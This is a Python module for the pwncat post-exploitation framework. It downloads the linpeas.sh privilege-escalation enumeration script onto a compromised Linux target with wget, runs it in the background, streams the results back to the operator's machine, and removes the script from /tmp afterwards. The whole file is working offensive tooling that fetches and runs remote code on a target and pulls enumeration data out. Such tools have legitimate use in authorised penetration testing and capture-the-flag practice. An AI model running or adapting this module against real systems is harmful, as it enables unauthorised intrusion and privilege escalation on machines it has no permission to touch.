#!/usr/bin/env python3
"""
Execute linpeas.sh on the target system and stream output in real-time.
Downloads linpeas.sh directly to the target, executes it, and streams the output
to the local terminal while also saving it to a local temporary file.
"""

import os
import tempfile
import subprocess
import threading
from pathlib import Path
from typing import Optional

import pwncat
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument, Result
from pwncat.platform.linux import Linux
from pwncat.util import console


class Module(BaseModule):
    """
    pwncat-vl module to execute linpeas.sh on the target system.
    Downloads linpeas directly to the target, executes it, and streams the output
    to the local terminal while also saving it to a local temporary file.
    
    Returns a Result object containing the path to the output file.
    This module runs in the background, allowing the main terminal to continue working.
    """
    
    PLATFORM = [Linux]
    COLLAPSE_RESULT = True  # Return single result instead of list
    
    ARGUMENTS = {
        "output_file": Argument(
            str, 
            help="Path to save linpeas output locally (default: temporary file)",
            default=None
        ),
        "local": Argument(
            bool,
            help="Open terminator window with tail command to monitor output in real-time",
            default=True
        )
    }

    def run(self, session: "pwncat.manager.Session", output_file: Optional[str] = None, **kwargs):
        """
        Main method called by pwncat to run this module.
        Launches the linpeas execution in a background thread to avoid blocking the main terminal.
        """
        # Validate the platform
        if not isinstance(session.platform, Linux):
            raise ModuleFailed("This module requires a Linux platform")

        # Create local temporary file to store output if not provided
        if output_file is None:
            temp_fd, output_file = tempfile.mkstemp(suffix=".linpeas.txt", prefix="linpeas_")
            os.close(temp_fd)

        console.log("[blue]Starting linpeas.sh execution in background...")
        console.log(f"[blue]Output will be saved to: {output_file}")
        
        if kwargs.get('local', False):
            # Ensure output file exists before launching terminator
            Path(output_file).touch(exist_ok=True)
            
            # Launch terminator with tail command to monitor the output file in real-time
            try:
                subprocess.Popen(['terminator', '-x', 'bash', '-c', f'tail -n+0 -f "{output_file}"'])
                console.log(f"[green]Launched terminator window to monitor: {output_file}[/green]")
            except FileNotFoundError:
                console.log(f"[yellow]Warning: Could not launch terminator. Please install terminator or monitor manually with: tail -n+0 -f {output_file}[/yellow]")
        
        # Launch the actual execution in a background thread
        thread = threading.Thread(
            target=self._execute_linpeas,
            args=(session, output_file, kwargs)
        )
        thread.daemon = True
        thread.start()
        
        console.log("[green]linpeas.sh running in background. Main terminal is now available for other commands.")
        console.log(f"[green]You can monitor the output in another terminal with: tail -n+0 -f {output_file}")
        
        # Yield a Result object indicating the background execution
        class LinpeasResult(Result):
            def __init__(self, output_path, thread):
                super().__init__()
                self.output_path = output_path
                self.thread = thread
                
            def title(self, session):
                return f"[green]linpeas.sh started in background! Output saved to: {self.output_path}[/green]"
        
        yield LinpeasResult(output_file, thread)

    def _execute_linpeas(self, session: "pwncat.manager.Session", output_file: str, kwargs):
        """
        Internal method that executes linpeas in the background thread.
        """
        try:
            console.log("[blue]Downloading linpeas.sh to target...")
            download_cmd = "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh"
            result = session.platform.run(download_cmd, capture_output=True)
            
            if result.returncode != 0:
                console.log(f"[red]Failed to download linpeas.sh: {result.stderr.decode() if result.stderr else 'Download failed'}[/red]")
                return

            # Make it executable
            session.platform.run("chmod +x /tmp/linpeas.sh", capture_output=True)

            # Execute linpeas with a direct process that we can stream from
            console.log("[blue]Executing linpeas.sh, streaming output in real-time...")
            
            # Use Popen to execute linpeas and stream output in real-time
            proc = session.platform.Popen(["sh", "/tmp/linpeas.sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            
            # Open local file for writing
            with open(output_file, 'w', encoding='utf-8') as local_f:
                # Read output line by line
                for line in proc.stdout:
                    # Write to local file
                    local_f.write(line)
                    local_f.flush()
                    # Only print to console if not using local mode
                    if not kwargs.get('local', False):
                        # Print to console (preserving colors)
                        print(line, end='', flush=True)
                
                # Check if there are remaining lines after the process ends
                remaining = proc.stdout.read()
                if remaining:
                    local_f.write(remaining)
                    local_f.flush()
                    if not kwargs.get('local', False):
                        print(remaining, end='', flush=True)
            
            # Wait for process to complete
            proc.wait()
                
            console.log("\n[green]linpeas.sh execution completed!")
            console.log(f"[green]Output saved to: {output_file}")
            
        except Exception as e:
            console.log(f"[red]Failed to execute linpeas.sh: {str(e)}[/red]")

        finally:
            # Cleanup temporary file on target
            try:
                session.platform.run("rm -f /tmp/linpeas.sh", capture_output=True)
            except:
                pass  # Ignore cleanup errors